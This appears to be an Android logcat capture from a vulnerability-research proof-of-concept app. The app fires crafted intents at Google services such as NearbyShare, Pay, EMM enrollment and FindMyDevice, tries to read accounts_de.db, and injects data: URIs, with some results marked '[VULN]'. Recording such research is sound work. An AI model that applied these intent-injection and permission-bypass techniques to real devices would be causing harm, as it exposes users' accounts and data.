09-07 08:03:22.230 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:am start -n com.vrp.poc/.CompatDeepImpactActivity'
09-07 08:03:22.268  1431  2256 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{9aaa2f2 #352 type=standard A=10385:com.vrp.poc} activity=ActivityRecord{222303741 u0 com.vrp.poc/.CompatDeepImpactActivity t-1} display-from-task=0 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-task=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
09-07 08:03:22.268  1431  2256 I ActivityTaskManager: START u0 {flg=0x10000000 xflg=0x5 cmp=com.vrp.poc/.CompatDeepImpactActivity} with LAUNCH_MULTIPLE from uid 2000 (com.android.shell) (BAL_ALLOW_PERMISSION) result code=0
09-07 08:03:22.268  2052  2074 V WindowManagerShell: Transition requested (#1695): android.os.BinderProxy@c7d2081 TransitionRequestInfo { type = OPEN, triggerTask = TaskInfo{userId=0 taskId=352 effectiveUid=10385 displayId=0 isRunning=true baseIntent=Intent { flg=0x10000000 cmp=com.vrp.poc/.CompatDeepImpactActivity } baseActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity} topActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity} origActivity=null realActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity} realActivityIsAppLockEnabled=false numActivities=1 lastActiveTime=288499780 supportsMultiWindow=true supportsMultiWindowWithoutConstraints=true resizeMode=1 isResizeable=true minWidth=-1 minHeight=-1 defaultMinSize=220 token=WCT{android.os.BinderProxy@5f45526} topActivityType=1 pictureInPictureParams=null shouldDockBigOverlays=false launchIntoPipHostTaskId=-1 lastParentTaskIdBeforePip=-1 displayCutoutSafeInsets=Rect(0, 132 - 0, 0) topActivityInfo=ActivityInfo{c5e0567 com.vrp.poc.CompatDeepImpactActivity} launchCookies=[] positionInParent=Point(0, 0) parentTaskId=-1 isFocused=false isInteractive=false isVisible=false isVisibleRequested=false isTopActivityNoDisplay=false isSleeping=false locusId=null displayAreaFeatureId=1 isTopActivityTransparent=false isActivityStackTransparent=false lastNonFullscreenBounds=Rect(276, 694 - 804, 1774) leafTaskBoundsFromOptions= false capturedLink=null capturedLinkTimestamp=0 requestedVisibleTypes=503 topActivityRequestOpenInBrowserEducationTimestamp=0 appCompatTaskInfo=AppCompatTaskInfo { topActivityInSizeCompat=false isLeafTask= true eligibleForLetterboxEducation= false isLetterboxEducationEnabled= false isLetterboxDoubleTapEnabled= false eligibleForUserAspectRatioButton= false topActivityBoundsLetterboxed= false isFromLetterboxDoubleTap= false topActivityLetterboxVerticalPosition= -1 topActivityLetterboxHorizontalPosition= -1 topActivityLetterboxWidth=-1 topActivityLetterboxHeight=-1 topActivityAppBounds=Rect(0, 0 - 1080, 2400) isUserFullscreenOverrideEnabled=false isSystemFullscreenOverrideEnabled=false hasMinAspectRatioOverride=false topActivityLetterboxBounds=null topNonResizableActivityAspectRatio=-1.0} topActivityMainWindowFrame=null isAppBubble=false}, pipChange = null, remoteTransitionInfo = null, displayChanges = null, requestedLocation = null, userChange = null, windowingLayerChange = null, fullscreenRequestChange = null, flags = 0, debugId = 1695 }
09-07 08:03:22.280  1431  1502 I ActivityManager: Start proc 20108:com.vrp.poc/u0a385 for next-top-activity {com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity}
09-07 08:03:22.302  1431  1486 V WindowManager: Sent Transition (#1695) createdAt=09-07 08:03:22.264 via request=TransitionRequestInfo { type = OPEN, triggerTask = TaskInfo{userId=0 taskId=352 effectiveUid=10385 displayId=0 isRunning=true baseIntent=Intent { flg=0x10000000 cmp=com.vrp.poc/.CompatDeepImpactActivity } baseActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity} topActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity} origActivity=null realActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity} realActivityIsAppLockEnabled=false numActivities=1 lastActiveTime=288499780 supportsMultiWindow=true supportsMultiWindowWithoutConstraints=true resizeMode=1 isResizeable=true minWidth=-1 minHeight=-1 defaultMinSize=220 token=WCT{RemoteToken{917a4f3 Task{9aaa2f2 #352 type=standard A=10385:com.vrp.poc}}} topActivityType=1 pictureInPictureParams=null shouldDockBigOverlays=false launchIntoPipHostTaskId=-1 lastParentTaskIdBeforePip=-1 displayCutoutSafeInsets=Rect(0, 132 - 0, 0) topActivityInfo=ActivityInfo{a4575b0 com.vrp.poc.CompatDeepImpactActivity} launchCookies=[] positionInParent=Point(0, 0) parentTaskId=-1 isFocused=false isInteractive=false isVisible=false isVisibleRequested=false isTopActivityNoDisplay=false isSleeping=false locusId=null displayAreaFeatureId=1 isTopActivityTransparent=false isActivityStackTransparent=false lastNonFullscreenBounds=Rect(276, 694 - 804, 1774) leafTaskBoundsFromOptions= false capturedLink=null capturedLinkTimestamp=0 requestedVisibleTypes=503 topActivityRequestOpenInBrowserEducationTimestamp=0 appCompatTaskInfo=AppCompatTaskInfo { topActivityInSizeCompat=false isLeafTask= true eligibleForLetterboxEducation= false isLetterboxEducationEnabled= false isLetterboxDoubleTapEnabled= false eligibleForUserAspectRatioButton= false topActivityBoundsLetterboxed= false isFromLetterboxDoubleTap= false topActivityLetterboxVerticalPosition= -1 topActivityLetterboxHorizontalPosition= -1 topActivityLetterboxWidth=-1 topActivityLetterboxHeight=-1 topActivityAppBounds=Rect(0, 0 - 1080, 2400) isUserFullscreenOverrideEnabled=false isSystemFullscreenOverrideEnabled=false hasMinAspectRatioOverride=false topActivityLetterboxBounds=null topNonResizableActivityAspectRatio=-1.0} topActivityMainWindowFrame=null isAppBubble=false}, pipChange = null, remoteTransitionInfo = null, displayChanges = null, requestedLocation = null, userChange = null, windowingLayerChange = null, fullscreenRequestChange = null, flags = 0, debugId = 1695 }
09-07 08:03:22.338 20108 20157 D CompatDeepImpact: === TEST 1: DETECT_IMPLICIT_URI_PERMISSION_GRANT bypass ===
09-07 08:03:22.338 20108 20157 D CompatDeepImpact: CompatChange 460838111 — enableSinceTargetSdk=37 (NOT enforced)
09-07 08:03:22.356 20108 20108 D VRI[CompatDeepImpactActivity]: WindowInsets changed: 1080x2400 statusBars:[0,132,0,0] navigationBars:[0,0,0,63] mandatorySystemGestures:[0,164,0,84] 
09-07 08:03:22.356  1431  1701 D CoreBackPreview: Window{147a7a9 u0 com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity}: Setting back callback OnBackInvokedCallbackInfo{mCallback=android.window.IOnBackInvokedCallback$Stub$Proxy@67e8c1d, mPriority=0, mIsAnimationCallback=false, mOverrideBehavior=0}
09-07 08:03:22.356 20108 20157 D CompatDeepImpact: [ERROR] URI grant: ActivityNotFoundException No Activity found to handle Intent { act=android.intent.action.VIEW dat=content:...
09-07 08:03:22.365 20108 20157 D CompatDeepImpact: [SENT] NearbyShare with contact URI + grant flag
09-07 08:03:22.365 20108 20157 D CompatDeepImpact: === TEST 2: RESTRICT_DATA_URI_COLUMNS bypass ===
09-07 08:03:22.365 20108 20157 D CompatDeepImpact: CompatChange 437318646 — enableSinceTargetSdk=37 (NOT enforced)
09-07 08:03:22.366  1431  2256 D WindowManager: setClientSurface Surface(name=VRI-com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity#6753)/@0xe7fb68d for 147a7a9 com.vrp.poc/com.vrp.poc.CompatDeepImpactActivity
09-07 08:03:22.368 20108 20108 I Surface : Creating surface for consumer VRI[CompatDeepImpactActivity]#0(BLAST Consumer)0 with slotExpansion=1 for 64 slots
09-07 08:03:22.380 20108 20157 D CompatDeepImpact: Calendar query with data: URI column: 4 rows
09-07 08:03:22.380 20108 20157 D CompatDeepImpact: [VULN] data: URI column returned: data:text/html,<h1>injected</h1>
09-07 08:03:22.380 20108 20157 D CompatDeepImpact: RESTRICT_DATA_URI_COLUMNS is NOT enforced — data URIs pass through
09-07 08:03:22.383 20108 20157 D CompatDeepImpact: [VULN] binary data: URI in column: data:application/octet-stream;base64,SGVsbG8=
09-07 08:03:22.385 20108 20157 D CompatDeepImpact: === TEST 3: Google Pay Activity with crafted data ===
09-07 08:03:22.386 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity.testGmsPayWithCraftedData(CompatDeepImpactActivity.java:151)
09-07 08:03:22.386 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity.runTests(CompatDeepImpactActivity.java:43)
09-07 08:03:22.386 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity.$r8$lambda$8h0T8PtG5--eqkAwkFIDYQCOQDg(CompatDeepImpactActivity.java:0)
09-07 08:03:22.386 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity$$ExternalSyntheticLambda0.run(D8$$SyntheticClass:0)
09-07 08:03:22.395 20108 20157 D CompatDeepImpact: [SENT] Pay image activity with crafted content URI
09-07 08:03:22.395 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity.testGmsPayWithCraftedData(CompatDeepImpactActivity.java:165)
09-07 08:03:22.395 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity.runTests(CompatDeepImpactActivity.java:43)
09-07 08:03:22.395 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity.$r8$lambda$8h0T8PtG5--eqkAwkFIDYQCOQDg(CompatDeepImpactActivity.java:0)
09-07 08:03:22.395 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity$$ExternalSyntheticLambda0.run(D8$$SyntheticClass:0)
09-07 08:03:22.408 20108 20157 D CompatDeepImpact: [SENT] Pay additional mime with crafted content URI
09-07 08:03:22.408 20108 20157 D CompatDeepImpact: === TEST 4: NearbyShare with malicious data ===
09-07 08:03:22.408 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity.testNearbyShareInjection(CompatDeepImpactActivity.java:184)
09-07 08:03:22.408 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity.runTests(CompatDeepImpactActivity.java:44)
09-07 08:03:22.408 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity.$r8$lambda$8h0T8PtG5--eqkAwkFIDYQCOQDg(CompatDeepImpactActivity.java:0)
09-07 08:03:22.408 20108 20157 E Intent  : 	at com.vrp.poc.CompatDeepImpactActivity$$ExternalSyntheticLambda0.run(D8$$SyntheticClass:0)
09-07 08:03:22.408 20108 20157 D CompatDeepImpact: [ERROR] NearbyShare file: FileUriExposedException file:///data/system/users/0/accounts_de.db exposed beyond app through ClipData.I...
09-07 08:03:22.414 20108 20157 D CompatDeepImpact: [SENT] NearbyShare with injected text
09-07 08:03:22.414 20108 20157 D CompatDeepImpact: === TEST 5: EMM Activity — enterprise enrollment ===
09-07 08:03:22.419 20108 20157 D CompatDeepImpact: [SENT] EMM with attacker-controlled account + device admin extras
09-07 08:03:22.419 20108 20157 D CompatDeepImpact: === TEST 6: GMS Backup Settings ===
09-07 08:03:22.428 20108 20157 D CompatDeepImpact: [SENT] BackupSettings with account extra
09-07 08:03:22.428 20108 20157 D CompatDeepImpact: === TEST 7: GMS Growth WebView — URL injection ===
09-07 08:03:22.442 20108 20157 D CompatDeepImpact: [SENT] GrowthWebView with injected URL in multiple extras
09-07 08:03:22.442 20108 20157 D CompatDeepImpact: === TEST 8: Intent redirect via KidSetup ===
09-07 08:03:22.453 20108 20157 D CompatDeepImpact: [SENT] KidSetup with nested intent extras
09-07 08:03:22.458 20108 20157 D CompatDeepImpact: [SENT] FindMyDevice sync with injected key data
09-07 08:03:22.459 20108 20157 D CompatDeepImpact: === ALL DEEP IMPACT TESTS COMPLETE ===
09-07 08:03:22.676 20108 20108 D VRI[CompatDeepImpactActivity]: visibilityChanged oldVisibility=true newVisibility=false
09-07 08:03:32.318 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d' '-s' 'CompatDeepImpact:D''
